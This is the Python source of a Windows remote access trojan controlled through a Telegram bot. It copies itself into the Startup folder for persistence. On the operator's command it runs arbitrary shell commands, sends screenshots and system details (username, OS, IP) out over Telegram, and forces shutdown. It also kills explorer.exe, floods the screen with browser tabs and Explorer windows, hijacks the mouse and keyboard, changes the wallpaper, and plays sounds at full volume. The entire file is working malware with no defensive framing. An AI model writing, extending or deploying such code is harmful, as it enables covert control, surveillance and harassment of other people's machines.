import telebot
import os
import getpass
import platform
import subprocess
import socket
import psutil
from telebot import types
from PIL import ImageGrab
import random
import shutil
import webbrowser
import ctypes
import sys
import pyautogui
import time, threading
import keyboard as kb
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
import pygame

bot_token = 'your bot token from -> @BotFather'
bot = telebot.TeleBot(bot_token)

devices = {}
cmd_spam_processes = []

def keyboard():
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add(types.KeyboardButton('/commands'), types.KeyboardButton('/help'))
    return markup


def add_to_startup_for_device():
    if getattr(sys, 'frozen', False):
        file_path = sys.executable
    else:
        file_path = os.path.abspath(__file__)

    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    try:
        shutil.copy(file_path, startup_folder)
    except Exception as e:
        print("Error")


@bot.message_handler(commands=['commands'])
def send_welcome(message):
    bot.send_message(
        message.chat.id,
        "Welcome to the multi-device bot!\n\n"
        "Commands:\n"
        "/devices - List all registered devices\n"
        "/cmd <command> - Run command on a specific device or all devices\n"
        "/screen - Take screenshot on a specific device or all devices\n"
        "/info - Get system info of a specific device or all devices\n"
        "/shutdown - Shutdown a specific device or all devices\n"
        "/explorer_spam - Spam File Explorer on a specific device or all devices\n"
        "/stop_explorer_spam - Stop File Explorer spam on a specific device or all devices\n"
        "/open_url <url> - Open a URL in the default browser on a specific device or all devices\n"
        "/stop_url - stops links from opening"
        "/cmd_spam <command> - Spam CMD with a specific command on a specific device or all devices\n"
        "/stop_cmd_spam - Stop CMD spam on a specific device or all devices\n"
        "/photo - puts up a custom wallpaper\n"
        "/mouse x y - moves the mouse to a given position\n"
        "/mouse_spam - moves the mouse to random positions\n"
        "/mouse_spam_stop - stops the mouse from moving\n"
        "/keyboard word/letter - writes any letter/word 1 time\n"
        "/keyboard_spam word/letter - spams an infinitely specified letter/word\n"
        "/keyboard_spam_stop - stops keyboard spam\n"
        "/sound - makes creepy sounds\n"
    )

@bot.message_handler(commands=['mouse'])
def move_mousik(message):
    try:
        args = message.text.split(' ')
        if len(args) < 3:
            bot.send_message(message.chat.id, "Usage: /mouse x y")
            return

        x = int(args[1])
        y = int(args[2])

        for device_id in devices.keys():
            pyautogui.moveTo(x, y)
        bot.send_message(message.chat.id, f"mouse executed to all")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

def set_volume():
    try:
        CoInitialize()

        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = interface.QueryInterface(IAudioEndpointVolume)

        volume.SetMasterVolumeLevelScalar(1.0, None)

    finally:
        CoUninitialize()

@bot.message_handler(commands=['sound'])
def play_sound(message):
    try:
        args = message.text.split(' ')
        if len(args) < 1:
            bot.send_message(message.chat.id, "Usage: /mouse")
            return

        for device_id in devices.keys():
            set_volume()
            pygame.init()
            song = pygame.mixer.Sound('ass.mp3')
            song.play()
            
            time.sleep(song.get_length())
            
            pygame.quit()
            bot.send_message(message.chat.id, "Sound played successfully.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

mouse_spam = False

def mouse_movik():
    global mouse_spam
    while not mouse_spam:
        x = random.randint(0, 1920)
        y = random.randint(0, 1080)
        pyautogui.moveTo(x, y)

@bot.message_handler(commands=['mouse_spam'])
def move_mousik(message):
    global mouse_spam
    try:
        args = message.text.split(' ')
        if len(args) < 1:
            bot.send_message(message.chat.id, "Usage: /mouse_spam")
            return

        for device_id in devices.keys():
            mouse_spam = False
            threading.Thread(target=mouse_movik, daemon=True).start()
        bot.send_message(message.chat.id, f"mouse_spam executed to all")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['mouse_spam_stop'])
def move_mousik(message):
    global mouse_spam
    try:
        args = message.text.split(' ')
        if len(args) < 1:
            bot.send_message(message.chat.id, "Usage: /mouse_spam_stop")
            return

        for device_id in devices.keys():
            mouse_spam = True
        bot.send_message(message.chat.id, f"mouse_spam executed on all")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

keyboard_start = False
letter = False

def Keyboardik(klavishi, lett):
    global keyboard_start
    while not keyboard_start:
        if lett:
            kb.press(klavishi)
        else:
            kb.write(klavishi, delay=0.1)

@bot.message_handler(commands=['keyboard'])
def move_mousik(message):
    try:
        args = message.text.split(' ')
        if len(args) < 2:
            bot.send_message(message.chat.id, "Usage: /keyboard word/letter")
            return

        klavisha = str(args[1])

        if len(klavisha) > 1:
            letter = False
        else:
            letter = True

        for device_id in devices.keys():
            if letter == True:
                kb.press(klavisha)
            else:
                kb.write(klavisha, delay=0.1)
            bot.send_message(message.chat.id, f"keyboard executed on all")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['keyboard_spam'])
def move_mousik(message):
    global keyboard_start
    try:
        args = message.text.split(' ')
        if len(args) < 2:
            bot.send_message(message.chat.id, "Usage: /keyboard_spam word/letter")
            return

        klavisha = str(args[1])

        if len(klavisha) > 1:
            letter = False
        else:
            letter = True

        for device_id in devices.keys():
            keyboard_start = False
            threading.Thread(target=Keyboardik, args=(klavisha, letter,), daemon=True).start()
        bot.send_message(message.chat.id, f"keyboard_spam executed on all")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['keyboard_spam_stop'])
def move_mousik(message):
    global keyboard_start
    try:
        args = message.text.split(' ')
        if len(args) < 1:
            bot.send_message(message.chat.id, "Usage: /keyboard_spam_stop")
            return

        for device_id in devices.keys():
            keyboard_start = True
        bot.send_message(message.chat.id, f"keyboard_spam was stopped to all")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['devices'])
def list_devices(message):
    if not devices:
        bot.send_message(message.chat.id, "No devices registered.")
    else:
        device_list = "\n".join([f"{device_id}: {name}" for device_id, name in devices.items()])
        bot.send_message(message.chat.id, f"Registered devices:\n{device_list}")

def set_wallpaper(file_id):
    file_info = bot.get_file(file_id)
    if not file_info or not file_info.file_path:
        raise Exception("Не удалось получить путь к файлу")
    
    downloaded_file = bot.download_file(file_info.file_path)
    save_dir = 'documents'
    if not os.path.exists(save_dir):
        os.makedirs(save_dir)
    
    save_path = os.path.join(save_dir, os.path.basename(file_info.file_path))
    with open(save_path, 'wb') as new_file:
        new_file.write(downloaded_file)

    ctypes.windll.user32.SystemParametersInfoA(20, 0, save_path.encode('utf-8'), 3)

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    try:
        file_id = message.photo[-1].file_id
        args = (message.caption or "").split(' ', 2)
        
        if len(args) < 1:
            bot.send_message(message.chat.id, "Usage: /photo")
            return
        
        for device_id in devices.keys():
            set_wallpaper(file_id)
            bot.reply_to(message, f"Обои успешно сохранены для: {devices[device_id]}")
    except Exception as e:
        bot.reply_to(message, f"Ошибка при получении фото: {e}")

@bot.message_handler(commands=['cmd'])
def run_command(message):
    try:
        args = message.text.split(' ', 2)
        if len(args) < 2:
            bot.send_message(message.chat.id, "Usage: /cmd <command>")
            return

        command = args[1]

        for device_id in devices.keys():
            subprocess.Popen(command, shell=True)
            bot.send_message(message.chat.id, f"Broadcast command executed on {devices[device_id]}: {command}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['screen'])
def take_screenshot(message):
    try:
        args = message.text.split(' ')
        if len(args) < 1:
            bot.send_message(message.chat.id, "Usage: /screen")
            return

        for device_id in devices.keys():
            screen_path = os.path.join(os.getenv('APPDATA'), f'Screenshot_{device_id}.jpg')
            ImageGrab.grab().save(screen_path)
            with open(screen_path, 'rb') as screen:
                bot.send_photo(message.chat.id, screen)
            os.remove(screen_path)
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

def get_local_ip():
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    return local_ip

@bot.message_handler(commands=['info'])
def get_system_info(message):
    try:
        args = message.text.split(' ')
        if len(args) < 1:
            bot.send_message(message.chat.id, "Usage: /info")
            return

        for device_id in devices.keys():
            username = getpass.getuser()
            os_info = platform.platform()
            processor = platform.processor()
            ip = get_local_ip()
            bot.send_message(
                message.chat.id,
                f"System Info for {devices[device_id]}:\n"
                f"Username: {username}\n"
                f"OS: {os_info}\n"
                f"Processor: {processor}\n"
                f"IP: {ip}"
            )
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['shutdown'])
def shutdown_device(message):
    try:
        args = message.text.split(' ')
        if len(args) < 1:
            bot.send_message(message.chat.id, "Usage: /shutdown")
            return

        for device_id in devices.keys():
            os.system('shutdown /s /f /t 0')
            bot.send_message(message.chat.id, f"Shutdown command executed on {devices[device_id]}.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

spam_thread = None
spam_running = False

def open_explorer():
    global spam_running
    spam_running = True
    while spam_running:
        subprocess.Popen(['explorer'])
        time.sleep(1)

def kill_explorer():
    global spam_running
    spam_running = False
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] == 'explorer.exe':
            proc.kill()

@bot.message_handler(commands=['explorer_spam'])
def explorer_spam(message):
    try:
        args = message.text.split(' ')
        if len(args) < 1:
            bot.send_message(message.chat.id, "Usage: /explorer_spam")
            return

        for device_id in devices.keys():
            threading.Thread(target=open_explorer, daemon=True).start()
            bot.send_message(message.chat.id, f"Explorer spam executed on {devices[device_id]}.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['stop_explorer_spam'])
def stop_explorer_spam(message):
    try:
        args = message.text.split(' ')
        if len(args) < 1:
            bot.send_message(message.chat.id, "Usage: /stop_explorer_spam")
            return

        for device_id in devices.keys():
            kill_explorer()
            bot.send_message(message.chat.id, f"Stopped Explorer spam on {devices[device_id]}.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

open_url = False

def open_links(url):
    global open_url
    while not open_url:
        webbrowser.open(url, new=2)
        time.sleep(1)

@bot.message_handler(commands=['open_url'])
def open_url(message):
    global open_url
    try:
        args = message.text.split(' ', 2)
        if len(args) < 2:
            bot.send_message(message.chat.id, "Usage: /open_url <url>")
            return

        url = args[1]

        if not (url.startswith("http://") or url.startswith("https://")):
            url = "https://" + url

        for device_id in devices.keys():
            open_url = False
            threading.Thread(target=open_links, args=(url,), daemon=True).start()
            bot.send_message(message.chat.id, f"URL opened on {devices[device_id]}: {url}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['stop_url'])
def open_url(message):
    global open_url
    try:
        args = message.text.split(' ', 2)
        if len(args) < 1:
            bot.send_message(message.chat.id, "Usage: /stop_url")
            return

        for device_id in devices.keys():
            open_url = True
            bot.send_message(message.chat.id, f"URL stopped on {devices[device_id]}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

device_id = 0
if __name__ == '__main__':
    try:
        while True:
            device_id += 1
            if device_id not in devices:
                break
        device_name = f"{getpass.getuser()}@{platform.node()} ({socket.gethostname()})"
        devices[device_id] = device_name
        print(f"Device registered: {device_name}\nID: {device_id}")
    except Exception as e:
        print("Error during registration")

    for device_id in devices.keys():
        add_to_startup_for_device()
    bot.polling()